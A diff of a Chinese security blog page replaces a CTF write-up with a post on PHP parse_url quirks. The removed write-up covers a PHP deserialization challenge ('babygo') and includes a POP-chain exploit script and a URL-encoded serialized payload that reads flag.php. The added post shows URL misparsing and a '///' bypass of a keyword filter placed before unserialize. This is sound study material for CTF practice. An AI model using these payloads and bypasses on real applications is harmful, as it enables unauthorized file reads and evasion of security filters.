@@ -75,7 +75,7 @@
 
 
 
-  <meta name="keywords" content="CTF,">
+  <meta name="keywords" content="tricks,">
 
 
 
@@ -86,24 +86,29 @@
 
 
 
-<meta name="description" content="webbabygo题目源码 &amp;lt;?php   @error_reporting(1);  include &amp;apos;flag.php&amp;apos;; class baby  {        protected $skyobj;       public $aaa;     public $bbb;     function __construct()      {">
-<meta name="keywords" content="CTF">
+<meta name="description" content="无协议报错&amp;lt;?php  $url = $_GET[&amp;apos;url&amp;apos;]; $data = parse_url($url);  var_dump($data); ?&amp;gt; 该函数在URL没有协议的时候，加上端口会报错  不加端口会正常进行解析  其他情况下可以正常解析  当端口有字母时，依然会正常解析  端口错误解析url为 http://127.0.0.1/demo1.php?">
+<meta name="keywords" content="tricks">
 <meta property="og:type" content="article">
-<meta property="og:title" content="安恒杯1月赛wp">
-<meta property="og:url" content="https://yml-sec.top/2019/01/31/安恒杯1月赛wp/index.html">
+<meta property="og:title" content="parse_url-的一些tricks">
+<meta property="og:url" content="https://yml-sec.top/2019/05/05/parse-url-的一些tricks/index.html">
 <meta property="og:site_name" content="yemoli&#39;s blog">
-<meta property="og:description" content="webbabygo题目源码 &amp;lt;?php   @error_reporting(1);  include &amp;apos;flag.php&amp;apos;; class baby  {        protected $skyobj;       public $aaa;     public $bbb;     function __construct()      {">
+<meta property="og:description" content="无协议报错&amp;lt;?php  $url = $_GET[&amp;apos;url&amp;apos;]; $data = parse_url($url);  var_dump($data); ?&amp;gt; 该函数在URL没有协议的时候，加上端口会报错  不加端口会正常进行解析  其他情况下可以正常解析  当端口有字母时，依然会正常解析  端口错误解析url为 http://127.0.0.1/demo1.php?">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="https://i.loli.net/2019/03/18/5c8f7292028e7.jpg">
-<meta property="og:image" content="https://i.loli.net/2019/03/18/5c8f72b1be83f.jpg">
-<meta property="og:image" content="https://i.loli.net/2019/03/18/5c8f72c89dbfc.jpg">
-<meta property="og:image" content="https://i.loli.net/2019/03/18/5c8f72dc62fff.jpg">
-<meta property="og:image" content="https://i.loli.net/2019/03/18/5c8f72efdbac3.jpg">
-<meta property="og:updated_time" content="2019-03-18T10:29:16.638Z">
+<meta property="og:image" content="https://i.loli.net/2019/05/05/5ccee953b07e7.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/05/05/5cceec50ad422.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/05/05/5ccee9d7a9c4c.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/05/05/5cceeae257bb3.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/05/05/5cceeda58c8ba.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/05/05/5cceecebaf5bd.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/05/05/5ccef121bd1e1.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/05/05/5ccef1c13eb10.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/05/05/5ccef4faa938d.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/05/05/5ccef540be26d.jpg">
+<meta property="og:updated_time" content="2019-05-05T14:40:50.956Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="安恒杯1月赛wp">
-<meta name="twitter:description" content="webbabygo题目源码 &amp;lt;?php   @error_reporting(1);  include &amp;apos;flag.php&amp;apos;; class baby  {        protected $skyobj;       public $aaa;     public $bbb;     function __construct()      {">
-<meta name="twitter:image" content="https://i.loli.net/2019/03/18/5c8f7292028e7.jpg">
+<meta name="twitter:title" content="parse_url-的一些tricks">
+<meta name="twitter:description" content="无协议报错&amp;lt;?php  $url = $_GET[&amp;apos;url&amp;apos;]; $data = parse_url($url);  var_dump($data); ?&amp;gt; 该函数在URL没有协议的时候，加上端口会报错  不加端口会正常进行解析  其他情况下可以正常解析  当端口有字母时，依然会正常解析  端口错误解析url为 http://127.0.0.1/demo1.php?">
+<meta name="twitter:image" content="https://i.loli.net/2019/05/05/5ccee953b07e7.jpg">
 
 
 
@@ -133,13 +138,13 @@
 
 
 
-  <link rel="canonical" href="https://yml-sec.top/2019/01/31/安恒杯1月赛wp/">
+  <link rel="canonical" href="https://yml-sec.top/2019/05/05/parse-url-的一些tricks/">
 
 
 
 
 
-  <title>安恒杯1月赛wp | yemoli's blog</title>
+  <title>parse_url-的一些tricks | yemoli's blog</title>
   
 
 
@@ -265,7 +270,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://yml-sec.top/2019/01/31/安恒杯1月赛wp/">
+    <link itemprop="mainEntityOfPage" href="https://yml-sec.top/2019/05/05/parse-url-的一些tricks/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="夜莫离、">
@@ -282,7 +287,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">安恒杯1月赛wp</h1>
+          <h1 class="post-title" itemprop="name headline">parse_url-的一些tricks</h1>
         
 
         <div class="post-meta">
@@ -294,8 +299,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-31T14:03:11+08:00">
-                2019-01-31
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-05-05T22:40:06+08:00">
+                2019-05-05
               </time>
             
 
@@ -326,7 +331,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  398
+                  239
                 </span>
               
 
@@ -342,7 +347,7 @@
                   <span class="post-meta-item-text">Reading time &asymp;</span>
                 
                 <span title="Reading time">
-                  2
+                  1
                 </span>
               
             </div>
@@ -363,139 +368,55 @@
       
 
       
-        <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="babygo"><a href="#babygo" class="headerlink" title="babygo"></a>babygo</h2><p>题目源码</p>
-<pre><code>&lt;?php  
-@error_reporting(1); 
-include &apos;flag.php&apos;;
-class baby 
-{   
-    protected $skyobj;  
-    public $aaa;
-    public $bbb;
-    function __construct() 
-    {      
-        $this-&gt;skyobj = new sec;
-    }  
-    function __toString()      
-    {          
-        if (isset($this-&gt;skyobj))  
-            return $this-&gt;skyobj-&gt;read();      
-    }  
-}  
+        <h1 id="无协议报错"><a href="#无协议报错" class="headerlink" title="无协议报错"></a>无协议报错</h1><pre><code>&lt;?php 
+$url = $_GET[&apos;url&apos;];
+$data = parse_url($url); 
+var_dump($data);
+?&gt;
+</code></pre><p>该函数在URL没有协议的时候，加上端口会报错</p>
+<p><img src="https://i.loli.net/2019/05/05/5ccee953b07e7.jpg" alt="7.jpg"></p>
+<p>不加端口会正常进行解析</p>
+<p><img src="https://i.loli.net/2019/05/05/5cceec50ad422.jpg" alt="10.jpg"></p>
+<p>其他情况下可以正常解析</p>
+<p><img src="https://i.loli.net/2019/05/05/5ccee9d7a9c4c.jpg" alt="8.jpg"></p>
+<p>当端口有字母时，依然会正常解析</p>
+<p><img src="https://i.loli.net/2019/05/05/5cceeae257bb3.jpg" alt="9.jpg"></p>
+<h1 id="端口错误解析"><a href="#端口错误解析" class="headerlink" title="端口错误解析"></a>端口错误解析</h1><p>url为</p>
+<pre><code>http://127.0.0.1/demo1.php?url=//yml-sec.top/index:80
+</code></pre><p>我们期望的解析结果是这样的</p>
+<p><img src="https://i.loli.net/2019/05/05/5cceeda58c8ba.jpg" alt="12.jpg"></p>
+<p>而实际的解析结果是这样的</p>
+<p><img src="https://i.loli.net/2019/05/05/5cceecebaf5bd.jpg" alt="11.jpg"></p>
+<h1 id="路径解析错误"><a href="#路径解析错误" class="headerlink" title="路径解析错误"></a>路径解析错误</h1><pre><code>http://127.0.0.1/demo1.php?url=//yml-sec.top?/index/config.php
+</code></pre><p>解析结果</p>
+<p><img src="https://i.loli.net/2019/05/05/5ccef121bd1e1.jpg" alt="13.jpg"></p>
+<pre><code>http://127.0.0.1/demo1.php?url=/yml-sec.top?/index/config.php
+</code></pre><p>解析结果</p>
+<p><img src="https://i.loli.net/2019/05/05/5ccef1c13eb10.jpg" alt="14.jpg"></p>
+<h1 id="解析返回false"><a href="#解析返回false" class="headerlink" title="///解析返回false"></a>///解析返回false</h1><p>如ciscn题目部分源码</p>
+<pre><code>&lt;?php 
+$payload= $_GET[&apos;url&apos;];
 
-class cool 
-{    
-    public $filename;     
-    public $nice;
-    public $amzing; 
-    function read()      
-    {   
-        $this-&gt;nice = unserialize($this-&gt;amzing);
-        $this-&gt;nice-&gt;aaa = $sth;
-        if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb)
-        {
-            $file = &quot;./{$this-&gt;filename}&quot;;        
-            if (file_get_contents($file))         
-            {              
-                return file_get_contents($file); 
-            }  
-            else 
-            { 
-                return &quot;you must be joking!&quot;; 
-            }    
+if(isset($payload)){  
+    $url = parse_url($_SERVER[&apos;REQUEST_URI&apos;]);
+    var_dump($url);
+    parse_str($url[&apos;query&apos;],$query);
+
+    foreach($query as $value){
+        if (preg_match(&quot;/flag/&quot;,$value)) { 
+            die(&apos;stop hacking!&apos;);
+            exit();
         }
-    }  
-}  
-
-class sec 
-{  
-    function read()     
-    {          
-        return &quot;it&apos;s so sec~~&quot;;      
-    }  
-}  
-
-if (isset($_GET[&apos;data&apos;]))  
-{ 
-    $Input_data = unserialize($_GET[&apos;data&apos;]);
-    echo $Input_data; 
-} 
-else 
-{ 
-    highlight_file(&quot;./index.php&quot;); 
+    }
+    $payload = unserialize($payload);
+}else{ 
+   echo &quot;Missing parameters&quot;; 
 } 
 ?&gt;
-</code></pre><p>这个和前几天博客讨论的反序列化pop链构造是一样的，直接放上payload</p>
-<pre><code>&lt;?php  
-@error_reporting(1); 
-include &apos;flag.php&apos;;
-class baby 
-{   
-    protected $skyobj;  
-    public $aaa;
-    public $bbb;
-    function __construct() 
-    {      
-        $this-&gt;skyobj = new cool();
-    }  
-    function __toString()      
-    {          
-        if (isset($this-&gt;skyobj))  
-            return $this-&gt;skyobj-&gt;read();      
-    }  
-}  
-
-class cool 
-{    
-    public $filename = &apos;flag.php&apos;;     
-    public $nice;
-    public $amzing; 
-    function read()      
-    {   
-        $this-&gt;nice = unserialize($this-&gt;amzing);
-        $this-&gt;nice-&gt;aaa = $sth;
-        if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb)
-        {
-            $file = &quot;./{$this-&gt;filename}&quot;;        
-            if (file_get_contents($file))         
-            {              
-                return file_get_contents($file); 
-            }  
-            else 
-            { 
-                return &quot;you must be joking!&quot;; 
-            }    
-        }
-    }  
-}  
-
-class sec 
-{  
-    function read()     
-    {          
-        return &quot;it&apos;s so sec~~&quot;;      
-    }  
-}  
-
-$a = new baby();
-$a = serialize($a);
-$a = urlencode($a);
-echo $a;
-?&gt;
-</code></pre><p>得到下面这串字符串：</p>
-<pre><code>O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3BN%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BN%3B%7D
-</code></pre><p>加入题目进行验证</p>
-<p><img src="https://i.loli.net/2019/03/18/5c8f7292028e7.jpg" alt=""></p>
-<p>成功获得flag</p>
-<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="zhunianjixiang"><a href="#zhunianjixiang" class="headerlink" title="zhunianjixiang"></a>zhunianjixiang</h2><p>题目是一张图片</p>
-<p><img src="https://i.loli.net/2019/03/18/5c8f72b1be83f.jpg" alt=""></p>
-<p>用foremost对文件提取，得到两张图片</p>
-<p><img src="https://i.loli.net/2019/03/18/5c8f72c89dbfc.jpg" alt=""></p>
-<p><img src="https://i.loli.net/2019/03/18/5c8f72dc62fff.jpg" alt=""></p>
-<p>扫描二维码</p>
-<p>提示二维码有古怪</p>
-<p>拖到stegsolve后发现flag</p>
-<p><img src="https://i.loli.net/2019/03/18/5c8f72efdbac3.jpg" alt=""></p>
+</code></pre><p>正常输入会拦截</p>
+<p><img src="https://i.loli.net/2019/05/05/5ccef4faa938d.jpg" alt="15.jpg"></p>
+<p>使用///时会成功的绕过</p>
+<p><img src="https://i.loli.net/2019/05/05/5ccef540be26d.jpg" alt="16.jpg"></p>
 
       
     </div>
@@ -542,7 +463,7 @@ echo $a;
       
         <div class="post-tags">
           
-            <a href="/tags/CTF/" rel="tag"># CTF</a>
+            <a href="/tags/tricks/" rel="tag"># tricks</a>
           
         </div>
       
@@ -555,8 +476,8 @@ echo $a;
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/01/30/RedHat-2017-pwn1题目复现/" rel="next" title="RedHat 2017-pwn1题目复现">
-                <i class="fa fa-chevron-left"></i> RedHat 2017-pwn1题目复现
+              <a href="/2019/05/05/ciscn2019-justsoso涉及及知识点总结/" rel="next" title="ciscn2019-justsoso涉及知识点总结">
+                <i class="fa fa-chevron-left"></i> ciscn2019-justsoso涉及知识点总结
               </a>
             
           </div>
@@ -564,10 +485,6 @@ echo $a;
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/02/08/浅谈ssrf绕过/" rel="prev" title="浅谈ssrf绕过">
-                浅谈ssrf绕过 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -746,7 +663,7 @@ echo $a;
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#web"><span class="nav-number">1.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#babygo"><span class="nav-number">1.1.</span> <span class="nav-text">babygo</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MISC"><span class="nav-number">2.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#zhunianjixiang"><span class="nav-number">2.1.</span> <span class="nav-text">zhunianjixiang</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#无协议报错"><span class="nav-number">1.</span> <span class="nav-text">无协议报错</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#端口错误解析"><span class="nav-number">2.</span> <span class="nav-text">端口错误解析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#路径解析错误"><span class="nav-number">3.</span> <span class="nav-text">路径解析错误</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#解析返回false"><span class="nav-number">4.</span> <span class="nav-text">///解析返回false</span></a></li></ol></div>
             
 
           </div>
